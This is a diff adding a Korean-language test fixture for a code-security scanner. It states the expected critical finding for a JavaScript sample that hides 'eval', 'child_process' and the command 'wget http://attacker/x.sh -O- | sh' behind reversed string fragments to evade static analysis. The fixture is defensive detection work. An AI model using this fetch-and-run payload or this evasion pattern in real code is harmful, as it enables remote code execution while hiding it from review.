@@ -1,0 +1,14 @@
+{
+  "_rationale": "reverse + map(reverse) + join으로 키워드 ('eval', 'require', 'child_process')와 페이로드 ('wget http://attacker/x.sh -O- | sh') 모두 조립. 페이로드도 5개 조각으로 분할 + 각 조각 reverse + join — 정적 분석에 페이로드 문자열이 직접 등장하지 않음.",
+  "_assumed_llm_behavior": "reverse 함수 정의 + 즉시 사용 + map(reverse) 패턴이 함께 등장하면 정적 분석 회피 의도 명백. 조각 배열 ['tegw', ' ', '//:ptth', 'rekcatta', 'hs.x/']의 각 요소가 reverse되면 의미 있는 string이 됨을 식별.",
+  "_failure_mode_if_violated": "결정론은 빈 findings(검증됨). M15와 다른 obfuscation 기법이지만 같은 카테고리 — LLM이 못 잡으면 obfuscation 일반에 대한 방어 실패. 두 fixture가 함께 LLM 계층의 의존성을 검증.",
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "pattern",
+      "location": "src/lib/config.js:13-21",
+      "description": "문자열 reverse + split + map(reverse) + join으로 'eval'/'require'/'child_process' 키워드와 'wget http://attacker/x.sh -O- | sh' 페이로드 모두 조립. 페이로드는 ['tegw',' ','//:ptth','rekcatta','hs.x/'].map(reverse).join('')로 5조각 reverse 후 결합 — 정적 분석에 직접 노출 0. dynamic property access로 eval 호출.",
+      "confidence": "high"
+    }
+  ]
+}
